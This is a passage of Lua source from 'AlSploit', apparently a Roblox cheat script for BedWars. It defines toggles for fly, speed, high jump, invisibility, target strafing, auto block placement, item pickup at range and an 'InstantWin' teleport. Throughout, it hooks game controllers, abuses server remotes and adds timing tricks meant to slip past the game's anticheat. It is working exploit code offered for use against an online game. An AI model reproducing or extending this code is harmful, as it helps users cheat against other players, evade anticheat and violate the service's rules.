		Function = function() end,

		DefaultValue = true
	})
end)

task.spawn(function()
	local EnemyMoveDirection = "Nil"
	local Angle = 0

	local TargetStrafePart = Instance.new("Part")

	TargetStrafePart.Parent = WorkSpace
	TargetStrafePart.Name = "TargetStrafePart"

	TargetStrafePart.Transparency = 0.5
	TargetStrafePart.CanCollide = false
	TargetStrafePart.Anchored = true

	local function CheckMovementDirection(Player, Entity)
		if Entity == false then
			local OriginalPosition = Vector3.new(DecimalRound(Player.Character.PrimaryPart.Position.X, 3), DecimalRound(Player.Character.PrimaryPart.Position.Y, 3), DecimalRound(Player.Character.PrimaryPart.Position.Z, 3))

			local BackwardPosition = (OriginalPosition - (Player.Character.PrimaryPart.CFrame.LookVector * 3))
			local ForwardPosition = (OriginalPosition + (Player.Character.PrimaryPart.CFrame.LookVector * 3))

			task.wait(0.05)

			if IsAlive(Player) == true then
				local NewPosition = Vector3.new(DecimalRound(Player.Character.PrimaryPart.Position.X, 3), DecimalRound(Player.Character.PrimaryPart.Position.Y, 3), DecimalRound(Player.Character.PrimaryPart.Position.Z, 3))

				local BackwardMagnitude = (NewPosition - BackwardPosition).Magnitude
				local ForwardMagnitude = (NewPosition - ForwardPosition).Magnitude

				local MoveDirection = ((BackwardMagnitude == ForwardMagnitude and "Stayed") or (BackwardMagnitude > ForwardMagnitude and "Forward") or (BackwardMagnitude < ForwardMagnitude and "Backward"))

				return MoveDirection
			end

			if IsAlive(Player) == false then
				return "Nil"
			end
		end

		if Entity == true then
			local OriginalPosition = Vector3.new(DecimalRound(Entity.PrimaryPart.Position.X, 3), DecimalRound(Entity.PrimaryPart.Position.Y, 3), DecimalRound(Entity.PrimaryPart.Position.Z, 3))

			local BackwardPosition = (OriginalPosition - (Player.Character.PrimaryPart.CFrame.LookVector * 3))
			local ForwardPosition = (OriginalPosition + (Player.Character.PrimaryPart.CFrame.LookVector * 3))

			task.wait(0.05)

			if Entity then
				local NewPosition = Vector3.new(DecimalRound(Entity.PrimaryPart.Position.X, 3), DecimalRound(Entity.PrimaryPart.Position.Y, 3), DecimalRound(Entity.PrimaryPart.Position.Z, 3))

				local BackwardMagnitude = (NewPosition - BackwardPosition).Magnitude
				local ForwardMagnitude = (NewPosition - ForwardPosition).Magnitude

				local MoveDirection = ((BackwardMagnitude == ForwardMagnitude and "Stayed") or (BackwardMagnitude > ForwardMagnitude and "Forward") or (BackwardMagnitude < ForwardMagnitude and "Backward"))

				return MoveDirection
			end

			if not Entity then
				return "Nil"
			end
		end
	end

	local TargetStrafe = BlatantTab:CreateToggle({
		Name = "TargetStrafe",

		Function = function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					local NearestPlayer, NearestPlayerDistance = FindNearestPlayer((AlSploitSettings.TargetStrafe.Range.Value + 4))
					local NearestEntity, NearestEntityDistance = FindNearestEntity((AlSploitSettings.TargetStrafe.Range.Value + 4))	


					if AlSploitSettings.TargetStrafe.StrafeMode["1v1"].Value == true then
						if NearestPlayer or NearestEntity then
							task.spawn(function()
								EnemyMoveDirection = CheckMovementDirection(NearestPlayer, false)
							end)

							local NearestEntityPrimaryPart

							task.spawn(function()
								NearestEntityPrimaryPart = (AlSploitSettings.TargetStrafe.TargetMobs.Value == true and (NearestEntity and NearestEntity.PrimaryPart or nil) or (NearestPlayer and NearestPlayer.Character.PrimaryPart or nil))
							end)

							if NearestEntityPrimaryPart and EnemyMoveDirection == "Backward" then
								local LocalPlayerPrimaryPart = LocalPlayer.Character.PrimaryPart

								Angle = (Angle + 0.075)

								local X = (math.cos(Angle) * AlSploitSettings.TargetStrafe.Range.Value)
								local Z = (math.sin(Angle) * AlSploitSettings.TargetStrafe.Range.Value)

								local TargetPosition = Vector3.new((NearestEntityPrimaryPart.Position.X + X), NearestEntityPrimaryPart.Position.Y, (NearestEntityPrimaryPart.Position.Z + Z))

								local RaycastParameters = RaycastParams.new()

								RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
								RaycastParameters.FilterType = Enum.RaycastFilterType.Include

								local Raycast = WorkSpace:Raycast(TargetPosition, Vector3.new(0, -1000, 0), RaycastParameters)

								if Raycast and Raycast.Position then
									local Velocity = ((TargetPosition - LocalPlayerPrimaryPart.Position).Unit * 23)

									LocalPlayerPrimaryPart.Velocity = Velocity
								end
							end

							if NearestEntityPrimaryPart and EnemyMoveDirection == "Forward" or EnemyMoveDirection == "Stayed" then
								local LocalPlayerPrimaryPart = LocalPlayer.Character.PrimaryPart

								Angle = (Angle + 0.075)

								local X = (math.cos(Angle) * (AlSploitSettings.TargetStrafe.Range.Value + 2))
								local Z = (math.sin(Angle) * (AlSploitSettings.TargetStrafe.Range.Value + 2))

								local TargetPosition = Vector3.new((NearestEntityPrimaryPart.Position.X + X), NearestEntityPrimaryPart.Position.Y, (NearestEntityPrimaryPart.Position.Z + Z))

								local RaycastParameters = RaycastParams.new()

								RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
								RaycastParameters.FilterType = Enum.RaycastFilterType.Include

								local Raycast = WorkSpace:Raycast(TargetPosition, Vector3.new(0, -1000, 0), RaycastParameters)

								if Raycast and Raycast.Position then
									local Velocity = ((TargetPosition - LocalPlayerPrimaryPart.Position).Unit * 23)

									LocalPlayerPrimaryPart.Velocity = Velocity
								end
							end
						end
					end

					if AlSploitSettings.TargetStrafe.StrafeMode.Normal.Value == true then
						local NearestEntityPrimaryPart

						task.spawn(function()
							NearestEntityPrimaryPart = (AlSploitSettings.TargetStrafe.TargetMobs.Value == true and (NearestEntity and NearestEntity.PrimaryPart or nil) or (NearestPlayer and NearestPlayer.Character.PrimaryPart or nil))
						end)

						local LocalPlayerPrimaryPart = LocalPlayer.Character.PrimaryPart

						Angle = (Angle + 0.075)

						local X = (math.cos(Angle) * AlSploitSettings.TargetStrafe.Range.Value)
						local Z = (math.sin(Angle) * AlSploitSettings.TargetStrafe.Range.Value)

						local TargetPosition = Vector3.new((NearestEntityPrimaryPart.Position.X + X), NearestEntityPrimaryPart.Position.Y, (NearestEntityPrimaryPart.Position.Z + Z))

						local RaycastParameters = RaycastParams.new()

						RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
						RaycastParameters.FilterType = Enum.RaycastFilterType.Include

						local Raycast = WorkSpace:Raycast(TargetPosition, Vector3.new(0, -1000, 0), RaycastParameters)

						if Raycast and Raycast.Position then
							local Velocity = ((TargetPosition - LocalPlayerPrimaryPart.Position).Unit * 23)

							LocalPlayerPrimaryPart.Velocity = Velocity
						end
					end
				end		
			until shared.AlSploitUnInjected == true or AlSploitSettings.TargetStrafe.Value == false
		end,

		HoverText = "Automatically Circles Around Desired Entities 💫"
	})

	local StrafeMode = TargetStrafe:CreateDropdown({
		Name = "StrafeMode",
		HoverText = "Adapts The TargetStrafe To The Selected Mode"
	})

	StrafeMode:CreateToggle({
		Name = "1v1",

		Function = function() end,

		DefaultValue = false
	})

	StrafeMode:CreateToggle({
		Name = "Normal",

		Function = function() end,

		DefaultValue = true
	})

	TargetStrafe:CreateToggle({
		Name = "JumpAutomatically",

		Function = function() end,

		DefaultValue = true
	})

	TargetStrafe:CreateToggle({
		Name = "TargetMobs",

		Function = function() end,

		DefaultValue = false
	})

	TargetStrafe:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 18,
		DefaultValue = 18
	})
end)

task.spawn(function()
	local InstantWin = BlatantTab:CreateToggle({
		Name = "InstantWin",

		Function = function()
			repeat 
				task.wait()

				if AlSploitSettings.InstantWin.Value == true and GetMatchState() == 0 then					
					CreateNotification(5, "Waiting For Match To Start For InstantWin") 

					task.wait(5)
				end
			until GetMatchState() ~= 0 or AlSploitSettings.InstantWin.Value == false or shared.AlSploitUnInjected == true

			if AlSploitSettings.InstantWin.Value == true then
				CreateNotification(3, "Starting InstantWin")

				AlSploitSettings.InstantWin.Value = false

				local TeleportData = TeleportService:GetLocalPlayerTeleportData() 

				TeleportService:Teleport(game.PlaceId, LocalPlayer, TeleportData)	
			end
		end,

		HoverText = "Wins the game instantly 🏆"
	})
end)

task.spawn(function()
	local HighJump, Self

	HighJump, Self = BlatantTab:CreateToggle({
		Name = "HighJump",

		Function = function()
			if AlSploitSettings.HighJump.Value == true and shared.AlSploitUnInjected == false and AnticheatBypassing == false then
				for i = 1, 3 do					
					if IsAlive(LocalPlayer) then
						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 0, LocalPlayer.Character.PrimaryPart.Velocity.Z)
						LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(LocalPlayer.Character.PrimaryPart.Position + Vector3.new(0, (AlSploitSettings.HighJump.Height.Value / 3), 0))

						task.wait(0.2)
					end
				end

				AlSploitSettings.HighJump.Value = false	
				Self.TextColor3 = Color3.new(1, 1, 1)
			end
		end,

		HoverText = "Makes You Jump High 🥾"
	})

	HighJump:CreateSlider({
		Name = "Height",

		Function = function() end,

		MaximumValue = 200,
		DefaultValue = 200
	})
end)

task.spawn(function()
	local InfiniteFlyDown
	local InfiniteFlyUp

	local Clone

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if UserInputService:GetFocusedTextBox() then return end

			if Input.KeyCode == Enum.KeyCode.LeftShift then
				InfiniteFlyDown = true
			end

			if Input.KeyCode == Enum.KeyCode.Space then
				InfiniteFlyUp = true
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputEnded:Connect(function(Input)
			if UserInputService:GetFocusedTextBox() then return end

			if Input.KeyCode == Enum.KeyCode.LeftShift then
				InfiniteFlyDown = false
			end

			if Input.KeyCode == Enum.KeyCode.Space then
				InfiniteFlyUp = false
			end
		end)
	end)	

	local InfiniteFly = BlatantTab:CreateToggle({
		Name = "InfiniteFly",

		Function = function()	
			if AlSploitSettings.InfiniteFly.Value == true and IsAlive(LocalPlayer) == true and AnticheatBypassing == false then	
				if not Clone then
					Clone = CreateClone(false)
				end

				Clone.PrimaryPart.Anchored = true
				Clone.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame

				LocalPlayer.Character.PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
			end

			repeat
				task.wait()

				if Clone then
					Clone.PrimaryPart.CFrame = CFrame.new(Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, (Clone.PrimaryPart.Position.Y + (InfiniteFlyUp and (AlSploitSettings.InfiniteFly.FlyUpSpeed.Value / 10) or 0) + (InfiniteFlyDown and -(AlSploitSettings.InfiniteFly.FlyDownSpeed.Value / 10) or 0)), LocalPlayer.Character.PrimaryPart.Position.Z))		
				end
			until shared.AlSploitUnInjected == true or AlSploitSettings.InfiniteFly.Value == false 

			if IsAlive(LocalPlayer) and Clone then
				LocalPlayer.Character.PrimaryPart.CFrame = Clone.PrimaryPart.CFrame
				LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)

				LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
			end

			if Clone then
				Clone:Destroy()
				Clone = nil

				Camera.CameraSubject = LocalPlayer.Character.Humanoid
			end
		end,

		HoverText = "Lets You Fly For An Infinite Amount Of Time 🦋"
	})

	InfiniteFly:CreateSlider({
		Function = function() end,

		Name = "FlyDownSpeed",
		MaximumValue = 25,
		DefaultValue = 5
	})

	InfiniteFly:CreateSlider({
		Name = "FlyUpSpeed",

		Function = function() end,

		MaximumValue = 25,
		DefaultValue = 5
	})
end)

task.spawn(function()
	local Invisible = BlatantTab:CreateToggle({
		Name = "Invisible",

		Function = function()
			if AlSploitSettings.Invisible.Value == true then
				Invisibility()
			end
		end,

		HoverText = "Makes You Invisible 👓"
	})

	AlSploitConnections["InvisibleConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		repeat task.wait() until IsAlive(LocalPlayer) == true

		if AlSploitSettings.Invisible.Value == true then
			Invisibility()
		end
	end)
end)

task.spawn(function()
	local Scaffold = BlatantTab:CreateToggle({
		Name = "Scaffold",

		Function = function()
			repeat
				task.wait()

				task.spawn(function()
					if IsAlive(LocalPlayer) == true and AlSploitSettings.Fly.Value == false and GetMatchState() ~= 0 then
						for i = 1, (AlSploitSettings.Scaffold.Expand.Value * 3) do
							local BuildPosition = (LocalPlayer.Character.PrimaryPart.Position + ((LocalPlayer.Character.PrimaryPart.CFrame.LookVector * i) - Vector3.new(0, (LocalPlayer.Character.PrimaryPart.Size.Y / 2) + ((LocalPlayer.Character.Humanoid.HipHeight + (LocalPlayer.Character.Humanoid.HipHeight / 2))), 0)))
							local RealBuildPosition = GetDevidedPosition(BuildPosition)
							local Block = GetBlock()

							if Block then
								BedwarsRemotes.BlockPlacingRemote:InvokeServer({blockType = Block, blockData = 0, position = RealBuildPosition})
							end
						end
					end
				end)
			until AlSploitSettings.Scaffold.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Places Blocks Automatically 🔨"
	})

	Scaffold:CreateSlider({
		Name = "Expand",

		Function = function() end,

		MaximumValue = 4,
		DefaultValue = 2
	})
end)

task.spawn(function()		
	local Spider = BlatantTab:CreateToggle({
		Name = "Spider",

		Function = function()
			task.spawn(function()
				if AlSploitSettings.Spider.Value == true then
					AlSploitConnections["SpiderConnection"] = RunService.Heartbeat:Connect(function(Delta)
						if IsAlive(LocalPlayer) == true then
							local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

							local BlockRay = FindPlacedBlock(LocalPlayer.Character.PrimaryPart.Position + ((MoveDirection * 2) - Vector3.new(0, LocalPlayer.Character.Humanoid.HipHeight, 0)))				

							if BlockRay then
								LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, AlSploitSettings.Spider.Speed.Value, LocalPlayer.Character.PrimaryPart.Velocity.Z)							
							end
						end				
					end)
				end
			end)

			if AlSploitSettings.Speed.Value == false and AlSploitConnections["SpiderConnection"] then
				AlSploitConnections["SpiderConnection"]:Disconnect()
			end
		end,

		HoverText = "Gives You The Ability To Climb Like A Spider 🕷️"
	})

	Spider:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 60
	})
end)

task.spawn(function()
	local LocalPlayerSpeed

	local DeltaTime = 0.2
	local TopSpeed = 23.33

	task.spawn(function()
		local LastPosition = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, 0, LocalPlayer.Character.PrimaryPart.Position.Z)
		local LastTick = tick()

		repeat
			task.wait(0)

			local CurrentTick = tick()
			local DeltaTimeSinceLastUpdate = CurrentTick - LastTick

			if DeltaTimeSinceLastUpdate >= DeltaTime then
				if IsAlive(LocalPlayer) == true then
					local CurrentPosition = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, 0, LocalPlayer.Character.PrimaryPart.Position.Z)

					LocalPlayerSpeed = (CurrentPosition - LastPosition).Magnitude / DeltaTimeSinceLastUpdate

					LastPosition = CurrentPosition
					LastTick = CurrentTick
				end
			end
		until shared.AlSploitUnInjected == true
	end)

	task.spawn(function()
		repeat task.wait() until GetMatchState() ~= 0

		local ZephyrUpdate = BedwarsControllers.ZephyrController.updateJump

		BedwarsControllers.ZephyrController.updateJump = function(self, Orb, ...)
			ZephyrOrb = (IsAlive(LocalPlayer) == true and Orb or 0)

			return ZephyrUpdate(self, Orb, ...)
		end
	end)

	local Speed = BlatantTab:CreateToggle({
		Name = "Speed",

		Function = function()
			task.spawn(function()
				if AlSploitSettings.Speed.Value == true then
					AlSploitConnections["SpeedConnection"] = RunService.Heartbeat:Connect(function(Delta)
						if IsAlive(LocalPlayer) == true then
							local SpeedRaycastParameters = RaycastParams.new()

							SpeedRaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
							SpeedRaycastParameters.FilterType = Enum.RaycastFilterType.Include

							local SpeedValue = GetSpeed()

							local ExtraSpeedValue = ((LocalPlayerSpeed > 23 and LocalPlayerSpeed < TopSpeed) and TopSpeed - LocalPlayerSpeed or 0)

							local SpeedPosition = (LocalPlayer.Character.Humanoid.MoveDirection * ((SpeedValue + ExtraSpeedValue) * Delta))

							local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedPosition, SpeedRaycastParameters)

							if not Raycast then
								LocalPlayer.Character.PrimaryPart.CFrame = (LocalPlayer.Character.PrimaryPart.CFrame + SpeedPosition)
							end
						end				
					end)
				end
			end)

			if AlSploitSettings.Speed.Value == false and AlSploitConnections["SpeedConnection"] then
				AlSploitConnections["SpeedConnection"]:Disconnect()
			end
		end,

		HoverText = "Makes Your Speed Equal To The Desired Value ⚡"
	})

	Speed:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 23,
		DefaultValue = 23
	})
end)

task.spawn(function()	
	local MaxFlyTime = 2.3
	local FlyTime = tick()

	local FlyDown
	local FlyUp

	local FlyHud, NumberDisplay, SliderDisplay, UIStroke = CreateFlyHud()

	local BodyVelocity

	local Fly, Self

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if UserInputService:GetFocusedTextBox() then return end

			if Input.KeyCode == Enum.KeyCode.LeftShift then
				FlyDown = true
			end

			if Input.KeyCode == Enum.KeyCode.Space then
				FlyUp = true
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputEnded:Connect(function(Input)
			if UserInputService:GetFocusedTextBox() then return end

			if Input.KeyCode == Enum.KeyCode.LeftShift then
				FlyDown = false
			end

			if Input.KeyCode == Enum.KeyCode.Space then
				FlyUp = false
			end
		end)
	end)	

	Fly, Self = BlatantTab:CreateToggle({
		Name = "Fly",

		Function = function()
			FlyTime = 0

			if IsAlive(LocalPlayer) == true and AlSploitSettings.Fly.Value == true then
				BodyVelocity = Instance.new("BodyVelocity")

				BodyVelocity.Parent = LocalPlayer.Character.PrimaryPart
				BodyVelocity.Name = "FlyBodyVelocity"

				BodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
			end

			repeat
				task.wait()

				task.spawn(function()
					FlyHud.Visible = AlSploitSettings.Fly.FlyHud.Value

					if (tick() - FlyTime) <= MaxFlyTime then			
						local FlyTime = DecimalRound((tick() - FlyTime), 1)

						NumberDisplay.Text = FlyTime		

						local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)			
						local DisplayTween = TweenService:Create(SliderDisplay, TweenInformation, {Size = UDim2.new(FlyTime / MaxFlyTime, 0, 1, 0)})

						DisplayTween:Play()		

						if (tick() - FlyTime) <= 0.05 then
							local TweenInformation = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)			
							local DisplayTween = TweenService:Create(SliderDisplay, TweenInformation, {Size = UDim2.new(FlyTime / MaxFlyTime, 0, 1, 0)})

							DisplayTween:Play()	
						end

						NumberDisplay.Text = FlyTime

						local ColorSplit = string.split(AlSploitSettings.Fly.FlyHudUIStrokeColor.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						UIStroke.Color = Color3.new(R, G, B)

						local ColorSplit = string.split(AlSploitSettings.Fly.FlyHudSliderColor.Value, ",")

						local R2 = ColorSplit[1]
						local G2 = ColorSplit[2]
						local B2 = ColorSplit[3]

						SliderDisplay.BackgroundColor3 = Color3.new(R2, G2, B2)

						local ColorSplit3 = string.split(AlSploitSettings.Fly.FlyHudTextColor.Value, ",")

						local R3 = ColorSplit3[1]
						local G3 = ColorSplit3[2]
						local B3 = ColorSplit3[3]

						NumberDisplay.TextColor3 = Color3.new(R3, G3, B3)
					end			
				end)	

				if IsTouchingGround() == true then
					FlyTime = tick()
				end

				if BodyVelocity then
					BodyVelocity.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, ((FlyDown and -AlSploitSettings.Fly.FlyDownSpeed.Value or 0) + (FlyUp and AlSploitSettings.Fly.FlyUpSpeed.Value or 0)), LocalPlayer.Character.PrimaryPart.Velocity.Z)
				end

				if (tick() - FlyTime) >= MaxFlyTime and ScytheAnticheatDisabled == false then --if (tick() - FlyTime) >= MaxFlyTime and ScytheAnticheatDisabled == false and PacketDisablerSpeed == 0 then
					FlyTime = tick()

					local FlyTeleportPosition = 0
					local RaycastParameters = RaycastParams.new()

					RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
					RaycastParameters.FilterType = Enum.RaycastFilterType.Include

					local FlyRaycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, Vector3.new(0, -5000, 0), RaycastParameters)

					if FlyRaycast and IsAlive(LocalPlayer) == true then 
						local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}

						Args[2] = ((FlyRaycast.Position.Y + 1) + LocalPlayer.Character.Humanoid.HipHeight)

						FlyTeleportPosition = LocalPlayer.Character.PrimaryPart.Position.Y

						LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(unpack(Args))

						task.spawn(function()				
							task.wait(0.15)

							if IsAlive(LocalPlayer) == true then 									
								local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}	

								Args[2] = FlyTeleportPosition

								task.spawn(function()
									for i = 1, 100 do
										LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)

										task.wait(0.01)
									end
								end)

								LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(unpack(Args))																		
							end	
						end)
					end
				end
			until AlSploitSettings.Fly.Value == false or IsAlive(LocalPlayer) == false or shared.AlSploitUnInjected == true

			if BodyVelocity then
				BodyVelocity:Destroy()
			end

			FlyHud.Visible = false

			AlSploitSettings.Fly.Value = false
			Self.TextColor3 = Color3.new(1, 1, 1)
		end,		

		HoverText = "Makes You Fly 🐦"
	})

	Fly:CreateToggle({
		Name = "FlyHud",

		Function = function() end,

		DefaultValue = true
	})

	Fly:CreateSlider({
		Name = "FlyDownSpeed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 40
	})

	Fly:CreateSlider({
		Name = "FlyUpSpeed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 40
	})

	Fly:CreateColorSlider({
		Name = "FlyHudUIStrokeColor",

		Function = function() end,

		DefaultValue = Color3.new(0, 0.6, 1)
	})

	Fly:CreateColorSlider({
		Name = "FlyHudSliderColor",

		Function = function() end,

		DefaultValue = Color3.new(0, 0.6, 1)
	})

	Fly:CreateColorSlider({
		Name = "FlyHudTextColor",

		Function = function() end,

		DefaultValue = Color3.new(0, 0.6, 1)
	})
end)

task.spawn(function()
	local OldHorizontalOffset = BedwarsControllers.ViewModelController:GetAttribute("ConstantManager_HORIZONTAL_OFFSET")
	local OldVerticalOffset = BedwarsControllers.ViewModelController:GetAttribute("ConstantManager_VERTICAL_OFFSET")
	local OldDepthOffset = BedwarsControllers.ViewModelController:GetAttribute("ConstantManager_DEPTH_OFFSET")

	local ViewModelChanger = UtilityTab:CreateToggle({
		Name = "ViewModelChanger",

		Function = function()
			if AlSploitSettings.ViewModelChanger.Value == true and ViewModel and C1 then
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (AlSploitSettings.ViewModelChanger.Horizontal.Value / 10))
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_VERTICAL_OFFSET", (AlSploitSettings.ViewModelChanger.Vertical.Value / 10))
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_DEPTH_OFFSET", -(AlSploitSettings.ViewModelChanger.Depth.Value / 10))

				ViewModel:WaitForChild("RightHand"):WaitForChild("RightWrist").C1 = (C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad((AlSploitSettings.ViewModelChanger.Horizontal.Value / 3))))
			end

			if AlSploitSettings.ViewModelChanger.Value == false and ViewModel and C1 then
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", OldHorizontalOffset)
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_VERTICAL_OFFSET",  OldVerticalOffset)
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_DEPTH_OFFSET", OldDepthOffset)

				ViewModel:WaitForChild("RightHand"):WaitForChild("RightWrist").C1 = (C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad((OldHorizontalOffset / 3))))
			end
		end,

		HoverText = "Allows You To Change Your ViewModel (First Person Camera) 📷"
	})

	ViewModelChanger:CreateSlider({
		Name = "Horizontal",

		Function = function()
			if AlSploitSettings.ViewModelChanger.Value == true then
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (AlSploitSettings.ViewModelChanger.Horizontal.Value / 10))
			end
		end,

		MaximumValue = 45,
		DefaultValue = 15
	})

	ViewModelChanger:CreateSlider({
		Name = "Vertical",

		Function = function()
			if AlSploitSettings.ViewModelChanger.Value == true and ViewModel and C1 then
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_VERTICAL_OFFSET", (AlSploitSettings.ViewModelChanger.Vertical.Value / 10))

				C1 = (C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad((AlSploitSettings.ViewModelChanger.Horizontal.Value / 3))))
			end
		end,

		MaximumValue = 15,
		DefaultValue = 5
	})

	ViewModelChanger:CreateSlider({
		Name = "Depth",

		Function = function()
			if AlSploitSettings.ViewModelChanger.Value == true then
				BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_DEPTH_OFFSET", -(AlSploitSettings.ViewModelChanger.Depth.Value / 10))
			end
		end,

		MaximumValue = 105,
		DefaultValue = 35
	})

	UnInjectEvent.Event:Connect(function()
		BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", OldHorizontalOffset)
		BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_VERTICAL_OFFSET",  OldVerticalOffset)
		BedwarsControllers.ViewModelController:SetAttribute("ConstantManager_DEPTH_OFFSET", OldDepthOffset)

		ViewModel:WaitForChild("RightHand"):WaitForChild("RightWrist").C1 = (C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad((OldHorizontalOffset / 3))))
	end)
end)

task.spawn(function()
	local PickupItemRange = UtilityTab:CreateToggle({
		Name = "PickupItemRange",

		Function = function()			
			repeat
				task.wait()

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					for i, v in next, CollectionService:GetTagged("ItemDrop") do
						local Magnitude = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

						if Magnitude <= AlSploitSettings.PickupItemRange.Range.Value then
							BedwarsRemotes.PickupItemDropRemote:InvokeServer({itemDrop = v})
						end
					end
				end
			until AlSploitSettings.PickupItemRange.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Picks Up The Item From The Desired Range 🎖️"
	})

	PickupItemRange:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 10,
		DefaultValue = 10
	})
end)

task.spawn(function()
	local KillFeedHudGui

	task.spawn(function()
		repeat
			task.wait()

			if GetMatchState() ~= 0 then
				pcall(function()
					KillFeedHudGui = LocalPlayer.PlayerGui.KillFeedGui
				end)
			end	
		until KillFeedHudGui
	end)

	local HideKillFeed = UtilityTab:CreateToggle({
		Name = "HideKillFeedGui",

		Function = function()
			if AlSploitSettings.HideKillFeedGui.Value == true and KillFeedHudGui then
				KillFeedHudGui.Parent = ReplicatedStorageService
			end	

			if AlSploitSettings.HideKillFeedGui.Value == false and ReplicatedStorageService:FindFirstChild("KillFeedGui") then
				ReplicatedStorageService.KillFeedHud.Parent = LocalPlayer.PlayerGui
			end	
		end,

		HoverText = "Removes The Kill Feed 🖼️"
	})

	UnInjectEvent.Event:Connect(function()
		if ReplicatedStorageService:FindFirstChild("KillFeedHud") then
			ReplicatedStorageService.KillFeedHud.Parent = LocalPlayer.PlayerGui

			KillFeedHudGui = LocalPlayer.PlayerGui.KillFeedGui
		end	
	end)
end)

task.spawn(function()
	local EffectSpammer = UtilityTab:CreateToggle({
		Name = "EffectSpammer",

		Function = function()			
			repeat
				task.wait()

				if AlSploitSettings.EffectSpammer.Value == true and IsAlive(LocalPlayer) == true then
					if AlSploitSettings.EffectSpammer.DragonBreath.Value == true then
						BedwarsRemotes.DragonBreathRemote:FireServer({LocalPlayer})
					end

					if AlSploitSettings.EffectSpammer.Confetti.Value == true then
						BedwarsControllers.AbilityController:useAbility("PARTY_POPPER")
					end

					task.wait(25 /  AlSploitSettings.EffectSpammer.Speed.Value)
				end
			until AlSploitSettings.EffectSpammer.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Spams The The Desired Effects 💥"
	})

	EffectSpammer:CreateToggle({
		Name = "DragonBreath",

		Function = function() end,

		DefaultValue = false
	})

	EffectSpammer:CreateToggle({
		Name = "Confetti",

		Function = function() end,

		DefaultValue = true
	})

	EffectSpammer:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 100
	})
end)

task.spawn(function()
	local QueueType = GetQueueType()

	local AutoJoinQueue = UtilityTab:CreateToggle({
		Name = "AutoJoinQueue",

		Function = function() end,

		HoverText = "Joins The Queue Automatically For You At The End Of The Game 🥋"
	})

	task.spawn(function()
		if QueueType:find("Skywars") then
			repeat task.wait() until AlSploitSettings.AutoJoinQueue.Value == false or shared.AlSploitUnInjected == true or IsAlive(LocalPlayer) == false

			if AlSploitSettings.AutoJoinQueue.Value == true and shared.AlSploitUnInjected == false then
				BedwarsRemotes.JoinQueueRemote:FireServer({queueType = GetQueueType()})
			end			
		end
	end)

	task.spawn(function()
		repeat task.wait() until AlSploitSettings.AutoJoinQueue.Value == false or shared.AlSploitUnInjected == true or GetMatchState() == 2

		if AlSploitSettings.AutoJoinQueue.Value == true and shared.AlSploitUnInjected == false then
			BedwarsRemotes.JoinQueueRemote:FireServer({queueType = GetQueueType()})
		end	
	end)
end)

task.spawn(function()
	local MessageTable = {
